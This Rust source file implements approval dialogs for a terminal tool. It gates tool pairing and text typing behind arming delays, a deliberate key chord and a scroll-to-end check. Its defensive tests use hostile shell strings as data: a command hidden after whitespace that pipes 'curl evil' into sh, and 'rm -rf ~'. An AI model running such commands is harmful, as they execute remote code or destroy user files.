//! The approval dialogs' state and key handling, without any drawing.
//!
//! A dialog appears while the user may be typing into a pane, so nothing typed by
//! habit may answer it with a yes, and the user must be able to see everything
//! they approve:
//!
//! * plain Enter (and plain Ctrl+Enter) never approves, at any time;
//! * nothing approves during the first [`ARM_DELAY`] after the dialog opens, after
//!   any stray key the dialog swallowed, and after its window regains focus, so a
//!   key already on its way (or typing that goes on) lands on nothing;
//! * approving takes a deliberate chord, bound as a GPUI action in the dialog's own
//!   key context (Cmd+Enter on macOS, Ctrl+Shift+Enter elsewhere, which takes
//!   precedence over the same chord's workspace binding while the dialog is open; see
//!   `keybind::dialog_bindings`), or a click on the Approve button once armed;
//! * text that does not fit its box must be scrolled to the end once before
//!   Approve works ([`TextView`]);
//! * Escape denies at any time, since denying is always safe;
//! * "always allow typing" changes only by a click, never by a key.

use std::collections::BTreeSet;
use std::time::{Duration, Instant};

use halyard_ipc::{PairingDecision, PairingRequest, Scope, SendTextRequest};

/// How long a dialog ignores approving keys and clicks after it opens, after a
/// stray key, and after its window regains focus.
pub const ARM_DELAY: Duration = Duration::from_millis(700);

/// The longest escaped request a typing dialog shows; the server refuses longer
/// ones without a dialog. The text typed since the last approval is shown too, and
/// is bounded by the server at 4 KiB.
pub const MAX_DIALOG_TEXT_BYTES: usize = halyard_ipc::text::MAX_APPROVAL_DISPLAY_BYTES;

/// The question a dialog asks.
#[derive(Debug, Clone)]
pub enum Ask {
    /// Pair a tool.
    Pairing(PairingRequest),
    /// Type text into a pane.
    SendText(Box<SendTextRequest>),
}

/// The modifier keys held with a key press.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct Mods {
    /// Control.
    pub control: bool,
    /// Alt or Option.
    pub alt: bool,
    /// Shift.
    pub shift: bool,
    /// Cmd on macOS, Super elsewhere.
    pub platform: bool,
}

/// What a key or click did to the dialog.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Outcome {
    /// Nothing; the key was swallowed.
    Ignored,
    /// A checkbox changed; redraw.
    Changed,
    /// Scroll the text box by this many lines (negative: up); `i32::MAX` is the end.
    Scroll(i32),
    /// The user approved.
    Approve,
    /// The user denied.
    Deny,
}

/// The chord that approves, as GPUI keystrokes and as shown on the button.
#[must_use]
pub fn approve_chord(macos: bool) -> (&'static str, &'static str) {
    if macos { ("cmd-enter", "⌘⏎") } else { ("ctrl-shift-enter", "Ctrl+Shift+Enter") }
}

/// What the dialog knows about its scrolling box after a layout.
#[derive(Debug, Clone, Copy, PartialEq)]
pub struct BoxLayout {
    /// The box has been laid out (it has a size).
    pub laid_out: bool,
    /// How far the box can scroll, in pixels (0 when its content fits).
    pub max: f32,
    /// How far it is scrolled, from 0 to `max`.
    pub scrolled: f32,
    /// The box's bottom edge is inside the window. A dialog taller than its
    /// window (a short window) would otherwise hide the end of the box, or the
    /// box itself, below the window's edge while the box reports "fits".
    pub bottom_visible: bool,
}

/// Content shorter than the box by less than this still counts as fitting
/// (sub-pixel rounding in layout).
pub const FIT_TOLERANCE: f32 = 0.5;

/// How close to the end, in pixels, counts as having scrolled to it.
pub const END_TOLERANCE: f32 = 1.0;

/// Whether the dialog's text can be seen whole: the scroll gate for Approve.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TextView {
    /// Not laid out yet: Approve waits.
    Unknown,
    /// Everything fits in the box.
    Fits,
    /// The box scrolls and the end has not been seen yet.
    NeedsScroll,
    /// The box scrolls and the user has seen its end at least once.
    SeenEnd,
}

impl TextView {
    /// The next state, from the box's layout: `laid_out` once it has a size,
    /// `max` the scrollable height, `scrolled` how far it is scrolled (both in
    /// pixels, `scrolled` from 0 to `max`). Having seen the end is kept.
    #[must_use]
    pub fn observe(self, laid_out: bool, max: f32, scrolled: f32) -> Self {
        if !laid_out {
            return self;
        }
        if max <= FIT_TOLERANCE {
            return Self::Fits;
        }
        if self == Self::SeenEnd || scrolled >= max - END_TOLERANCE {
            Self::SeenEnd
        } else {
            Self::NeedsScroll
        }
    }

    /// Whether the user has been able to see all of it.
    #[must_use]
    pub fn seen(self) -> bool {
        matches!(self, Self::Fits | Self::SeenEnd)
    }
}

/// "12 characters, 1 line" for the dialog header.
#[must_use]
pub fn size_label(text: &str) -> String {
    let chars = text.chars().count();
    let text = text.replace("\r\n", "\n");
    let lines = text.split(['\n', '\r']).count();
    let lines = if text.ends_with(['\n', '\r']) { lines - 1 } else { lines }.max(1);
    format!(
        "{chars} character{}, {lines} line{}",
        if chars == 1 { "" } else { "s" },
        if lines == 1 { "" } else { "s" }
    )
}

/// One open dialog.
#[derive(Debug, Clone)]
pub struct Dialog {
    /// The question.
    pub ask: Ask,
    armed_at: Instant,
    /// Pairing: the scopes currently ticked, a subset of those requested.
    pub scopes: BTreeSet<Scope>,
    /// Pairing: "always allow typing from this tool" is ticked.
    pub always_allow_input: bool,
    /// Whether the scrolling box's content has been seen whole.
    pub view: TextView,
    /// Whether the scrolling box's bottom edge is inside the window now.
    pub box_visible: bool,
    /// Whether the box has been laid out at least once.
    laid_out: bool,
}

impl Dialog {
    /// A dialog opened at `now`. Pairing starts with every requested scope ticked
    /// and "always allow" off.
    #[must_use]
    pub fn new(ask: Ask, now: Instant) -> Self {
        let scopes = match &ask {
            Ask::Pairing(r) => r.scopes.clone(),
            Ask::SendText(_) => BTreeSet::new(),
        };
        Self {
            ask,
            armed_at: now + ARM_DELAY,
            scopes,
            always_allow_input: false,
            view: TextView::Unknown,
            box_visible: false,
            laid_out: false,
        }
    }

    /// Takes in the scrolling box's layout (each frame). Returns whether what
    /// Approve depends on changed.
    pub fn observe(&mut self, l: BoxLayout) -> bool {
        let before = (self.view, self.box_visible);
        if l.laid_out {
            self.laid_out = true;
            self.box_visible = l.bottom_visible;
            // The end only counts as seen while it is inside the window.
            if l.bottom_visible {
                self.view = self.view.observe(true, l.max, l.scrolled);
            } else if self.view == TextView::Unknown || self.view == TextView::Fits {
                self.view = TextView::Unknown;
            }
        }
        before != (self.view, self.box_visible)
    }

    /// Whether approving is possible yet, time-wise.
    #[must_use]
    pub fn armed(&self, now: Instant) -> bool {
        now >= self.armed_at
    }

    /// When the dialog arms.
    #[must_use]
    pub fn arms_at(&self) -> Instant {
        self.armed_at
    }

    /// Starts the arming delay again (a stray key, the window regaining focus).
    pub fn rearm(&mut self, now: Instant) {
        self.armed_at = self.armed_at.max(now + ARM_DELAY);
    }

    /// Why Approve does nothing right now, or `None` when it works.
    #[must_use]
    pub fn blocked(&self, now: Instant) -> Option<&'static str> {
        if self.laid_out && !self.box_visible {
            return Some("Make the window taller to see all of it");
        }
        if !self.view.seen() {
            return Some("Scroll to the end of the text first");
        }
        if matches!(self.ask, Ask::Pairing(_)) && self.scopes.is_empty() {
            return Some("Tick at least one scope");
        }
        if !self.armed(now) {
            return Some("Wait a moment");
        }
        None
    }

    /// The scopes the tool asked for, in order, for numbering the checkboxes.
    #[must_use]
    pub fn requested(&self) -> Vec<Scope> {
        match &self.ask {
            Ask::Pairing(r) => r.scopes.iter().copied().collect(),
            Ask::SendText(_) => Vec::new(),
        }
    }

    /// Whether the "always allow typing" box is offered: only for a pairing whose
    /// ticked scopes include `input:write`.
    #[must_use]
    pub fn offers_always(&self) -> bool {
        matches!(self.ask, Ask::Pairing(_)) && self.scopes.contains(&Scope::InputWrite)
    }

    /// Ticks or unticks a requested scope.
    pub fn toggle_scope(&mut self, scope: Scope) -> Outcome {
        if !self.requested().contains(&scope) {
            return Outcome::Ignored;
        }
        if !self.scopes.remove(&scope) {
            self.scopes.insert(scope);
        }
        if !self.offers_always() {
            self.always_allow_input = false;
        }
        Outcome::Changed
    }

    /// Ticks or unticks "always allow typing", when offered. Only a click calls
    /// this: no key can widen what a tool may do.
    pub fn click_always(&mut self, now: Instant) -> Outcome {
        if !self.offers_always() || !self.armed(now) {
            return Outcome::Ignored;
        }
        self.always_allow_input = !self.always_allow_input;
        Outcome::Changed
    }

    /// A key press that no binding took, at `now`. Approving is not here: it is
    /// the dialog's own action ([`Dialog::approve_action`]).
    pub fn key(&mut self, key: &str, m: Mods, now: Instant) -> Outcome {
        if key == "escape" {
            return Outcome::Deny;
        }
        let plain = !(m.control || m.platform || m.alt);
        if plain {
            match key {
                "down" => return Outcome::Scroll(1),
                "up" => return Outcome::Scroll(-1),
                "pagedown" => return Outcome::Scroll(8),
                "pageup" => return Outcome::Scroll(-8),
                "end" => return Outcome::Scroll(i32::MAX),
                "home" => return Outcome::Scroll(i32::MIN),
                _ => {}
            }
        }
        if plain
            && self.armed(now)
            && let Some(n) = key.parse::<usize>().ok().filter(|n| *n >= 1)
            && let Some(scope) = self.requested().get(n - 1).copied()
        {
            // Unticking narrows a pairing; ticking only restores what was asked.
            return self.toggle_scope(scope);
        }
        // A stray key: the user is typing, maybe without having seen the dialog.
        self.rearm(now);
        Outcome::Ignored
    }

    /// The approve chord (the dialog's GPUI action) or a click on Approve.
    pub fn approve_action(&mut self, now: Instant) -> Outcome {
        if self.blocked(now).is_some() {
            return Outcome::Ignored;
        }
        Outcome::Approve
    }

    /// The pairing answer for an approval.
    #[must_use]
    pub fn pairing_decision(&self) -> PairingDecision {
        PairingDecision::Approve {
            scopes: self.scopes.clone(),
            always_allow_input: self.always_allow_input && self.scopes.contains(&Scope::InputWrite),
        }
    }
}

/// One line explaining a scope, for the pairing dialog.
#[must_use]
pub fn scope_help(scope: Scope) -> &'static str {
    match scope {
        Scope::SessionsRead => "List panes: title, folder, agent and state",
        Scope::UiFocus => "Bring a pane to the front",
        Scope::ScreenRead => "Read the text on a pane's screen, including any secrets shown there",
        Scope::InputWrite => {
            "Type into panes. You approve each request unless you tick the box below; \
             text with Enter or any control character always asks"
        }
        Scope::EventsSubscribe => "Watch for state changes, notifications and exits",
    }
}

/// Whether a scope deserves the warning color.
#[must_use]
pub fn scope_is_sensitive(scope: Scope) -> bool {
    matches!(scope, Scope::InputWrite | Scope::ScreenRead)
}

#[cfg(test)]
mod tests {
    use super::*;
    use halyard_ipc::{PeerInfo, SendTextReason, SessionInfo};

    fn pairing(scopes: &[Scope]) -> Dialog {
        let mut d = Dialog::new(
            Ask::Pairing(PairingRequest {
                client_name: "tool".into(),
                scopes: scopes.iter().copied().collect(),
                peer: PeerInfo { pid: 1, uid: 1, exe: None },
            }),
            Instant::now(),
        );
        d.observe(fits());
        d
    }

    fn fits() -> BoxLayout {
        BoxLayout { laid_out: true, max: 0.0, scrolled: 0.0, bottom_visible: true }
    }

    fn at(max: f32, scrolled: f32) -> BoxLayout {
        BoxLayout { laid_out: true, max, scrolled, bottom_visible: true }
    }

    fn typing(text: &str) -> Dialog {
        Dialog::new(
            Ask::SendText(Box::new(SendTextRequest {
                grant_id: "g".into(),
                client_name: "tool".into(),
                session: SessionInfo {
                    id: "p".into(),
                    title: String::new(),
                    cwd: None,
                    agent: None,
                    state: None,
                },
                text: text.into(),
                display_text: halyard_ipc::text::escape_for_display(text),
                reason: SendTextReason::ControlCharacters,
                peer: PeerInfo { pid: 1, uid: 1, exe: None },
                typed_since_approval: String::new(),
                typed_since_approval_display: String::new(),
                typed_since_approval_truncated: false,
            })),
            Instant::now(),
        )
    }

    const NONE: Mods = Mods { control: false, alt: false, shift: false, platform: false };

    #[test]
    fn plain_enter_and_ctrl_enter_never_approve() {
        let mut d = pairing(&[Scope::SessionsRead]);
        let later = d.arms_at() + Duration::from_secs(5);
        for m in [
            NONE,
            Mods { shift: true, ..NONE },
            Mods { control: true, ..NONE },
            Mods { control: true, shift: true, ..NONE },
            Mods { platform: true, ..NONE },
        ] {
            assert_eq!(d.key("enter", m, later), Outcome::Ignored, "{m:?}");
        }
        // Keys never approve; only the dialog's action does.
        assert_eq!(d.approve_action(later + ARM_DELAY), Outcome::Approve);
    }

    #[test]
    fn the_approve_action_works_only_once_armed() {
        let mut d = pairing(&[Scope::SessionsRead]);
        let early = d.arms_at() - Duration::from_millis(1);
        assert_eq!(d.approve_action(early), Outcome::Ignored);
        assert_eq!(d.blocked(early), Some("Wait a moment"));
        assert_eq!(d.approve_action(d.arms_at()), Outcome::Approve);
    }

    #[test]
    fn a_stray_key_or_refocus_rearms() {
        let mut d = pairing(&[Scope::SessionsRead]);
        let t = d.arms_at() + Duration::from_secs(1);
        assert!(d.armed(t));
        assert_eq!(d.key("y", NONE, t), Outcome::Ignored);
        assert!(!d.armed(t), "a stray key starts the delay again");
        assert_eq!(d.approve_action(t + ARM_DELAY - Duration::from_millis(1)), Outcome::Ignored);
        assert_eq!(d.approve_action(t + ARM_DELAY), Outcome::Approve);
        let t2 = t + Duration::from_secs(5);
        d.rearm(t2);
        assert!(!d.armed(t2));
    }

    #[test]
    fn escape_denies_at_once() {
        let mut d = pairing(&[Scope::SessionsRead]);
        assert_eq!(d.key("escape", NONE, Instant::now()), Outcome::Deny);
    }

    #[test]
    fn always_allow_changes_only_by_click() {
        let mut d = pairing(&[Scope::SessionsRead, Scope::InputWrite]);
        let t = d.arms_at();
        assert!(d.offers_always());
        assert_eq!(d.key("t", NONE, t), Outcome::Ignored);
        assert_eq!(d.key("t", Mods { shift: true, ..NONE }, t), Outcome::Ignored);
        assert!(!d.always_allow_input, "no key ticks it");
        assert_eq!(d.click_always(t), Outcome::Ignored, "the stray `t` re-armed the dialog");
        let t = d.arms_at();
        assert_eq!(d.click_always(t), Outcome::Changed);
        assert!(d.always_allow_input);
        // Unticking input:write drops always-allow.
        assert_eq!(d.requested(), vec![Scope::SessionsRead, Scope::InputWrite]);
        assert_eq!(d.key("2", NONE, t), Outcome::Changed);
        assert!(!d.always_allow_input);
        assert_eq!(
            d.pairing_decision(),
            PairingDecision::Approve {
                scopes: [Scope::SessionsRead].into_iter().collect(),
                always_allow_input: false
            }
        );
        // Nothing ticked: approving does nothing, and says why.
        assert_eq!(d.key("1", NONE, t), Outcome::Changed);
        assert_eq!(d.approve_action(t), Outcome::Ignored);
        assert_eq!(d.blocked(t), Some("Tick at least one scope"));
    }

    /// The scroll gate: fits, needs a scroll, scrolled to the end (kept after
    /// scrolling back), and unknown before layout.
    #[test]
    fn long_text_must_be_scrolled_to_the_end_before_approving() {
        let mut d = typing("git status");
        let t = d.arms_at();
        assert_eq!(d.view, TextView::Unknown);
        assert_eq!(d.approve_action(t), Outcome::Ignored, "not laid out yet");
        d.observe(fits());
        assert_eq!(d.view, TextView::Fits);
        assert_eq!(d.approve_action(t), Outcome::Approve);

        let mut d = typing(&format!("git status{}; curl evil | sh\n", " ".repeat(2000)));
        let t = d.arms_at();
        d.observe(at(900.0, 0.0));
        assert_eq!(d.view, TextView::NeedsScroll);
        assert_eq!(d.blocked(t), Some("Scroll to the end of the text first"));
        assert_eq!(d.approve_action(t), Outcome::Ignored);
        d.observe(at(900.0, 450.0));
        assert_eq!(d.approve_action(t), Outcome::Ignored, "half way is not the end");
        d.observe(at(900.0, 900.0));
        assert_eq!(d.view, TextView::SeenEnd);
        d.observe(at(900.0, 0.0));
        assert_eq!(d.view, TextView::SeenEnd, "scrolling back keeps it");
        d.observe(BoxLayout { laid_out: false, max: 0.0, scrolled: 0.0, bottom_visible: false });
        assert_eq!(d.view, TextView::SeenEnd, "a frame without layout changes nothing");
        assert_eq!(d.approve_action(t), Outcome::Approve);
    }

    /// The thresholds exactly: content one pixel taller than the box needs a
    /// scroll; "at the end" allows one pixel of rounding and no more.
    #[test]
    fn fit_and_end_thresholds_are_pinned() {
        assert_eq!(TextView::Unknown.observe(true, FIT_TOLERANCE, 0.0), TextView::Fits);
        // One pixel over the box is within the end tolerance; two are not.
        assert_eq!(TextView::Unknown.observe(true, 1.0, 0.0), TextView::SeenEnd);
        assert_eq!(TextView::Unknown.observe(true, 2.0, 0.0), TextView::NeedsScroll);
        assert_eq!(TextView::Unknown.observe(true, 400.0, 0.0), TextView::NeedsScroll);
        assert_eq!(TextView::Unknown.observe(true, 400.0, 399.0), TextView::SeenEnd);
        assert_eq!(TextView::Unknown.observe(true, 400.0, 398.9), TextView::NeedsScroll);
        assert_eq!(TextView::Unknown.observe(false, 0.0, 0.0), TextView::Unknown);
    }

    /// A dialog taller than its window: the box (or its end) is below the
    /// window's edge, so its own "fits" or "seen the end" proves nothing. Approve
    /// waits until the box's bottom is inside the window, and the end seen there.
    #[test]
    fn the_box_must_be_inside_the_window() {
        let off =
            |max, scrolled| BoxLayout { laid_out: true, max, scrolled, bottom_visible: false };
        let mut d = typing("rm -rf ~\n");
        let t = d.arms_at();
        d.observe(off(0.0, 0.0));
        assert_eq!(d.blocked(t), Some("Make the window taller to see all of it"));
        assert_eq!(d.approve_action(t), Outcome::Ignored, "fits the box, but off screen");
        d.observe(fits());
        assert_eq!(d.approve_action(t), Outcome::Approve);
        // Scrolled to the end while the box was off screen does not count.
        let mut d = typing(&"x ".repeat(1000));
        d.observe(off(500.0, 500.0));
        assert_eq!(d.view, TextView::Unknown);
        let t = d.arms_at();
        d.observe(at(500.0, 0.0));
        assert_eq!(d.blocked(t), Some("Scroll to the end of the text first"));
        d.observe(at(500.0, 500.0));
        assert_eq!(d.approve_action(t), Outcome::Approve);
        // Shrinking the window afterwards blocks again.
        d.observe(off(500.0, 500.0));
        assert_eq!(d.approve_action(t), Outcome::Ignored);
        // The pairing dialog follows the same rule.
        let mut p = pairing(&[Scope::InputWrite]);
        p.observe(off(0.0, 0.0));
        assert_eq!(p.approve_action(p.arms_at()), Outcome::Ignored);
    }

    #[test]
    fn scroll_keys_scroll_and_do_not_rearm() {
        let mut d = typing("x");
        let t = d.arms_at();
        assert_eq!(d.key("end", NONE, t), Outcome::Scroll(i32::MAX));
        assert_eq!(d.key("pagedown", NONE, t), Outcome::Scroll(8));
        assert!(d.armed(t));
    }

    #[test]
    fn the_size_label_counts_characters_and_lines() {
        assert_eq!(size_label("git status"), "10 characters, 1 line");
        assert_eq!(size_label("a\nb\n"), "4 characters, 2 lines");
        assert_eq!(size_label("é"), "1 character, 1 line");
        assert_eq!(size_label("\r"), "1 character, 1 line");
        assert_eq!(size_label("a\r\nb"), "4 characters, 2 lines");
    }

    #[test]
    fn the_chord_is_never_plain_or_ctrl_enter() {
        for macos in [true, false] {
            let (ks, _) = approve_chord(macos);
            assert!(!matches!(ks, "enter" | "ctrl-enter" | "shift-enter"), "{ks}");
        }
    }
}
